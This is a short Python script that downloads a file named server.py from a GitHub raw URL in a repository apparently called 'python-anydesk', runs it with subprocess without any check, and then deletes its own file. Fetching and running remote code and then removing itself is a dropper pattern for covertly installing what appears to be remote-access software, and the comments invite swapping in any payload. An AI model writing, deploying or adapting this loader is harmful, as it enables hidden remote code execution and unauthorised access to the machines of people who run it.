import os
import requests
import subprocess

def download_file(url, file_name):
    with open(file_name, "wb") as f:
        response = requests.get(url)
        f.write(response.content)

def run_file(file_name):
    try:
        subprocess.run(['python', file_name], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running {file_name}: {e}")

def main():
    url = "https://raw.githubusercontent.com/developerrishi/python-anydesk/main/server.py" # Replace it with your file
    file_name = "server.py" # Name it according to you
    download_file(url, file_name)
    run_file(file_name)

    # Clean up: Delete itself after running
    os.remove("main.py") # Replace it with this file name

if __name__ == "__main__":
    main()
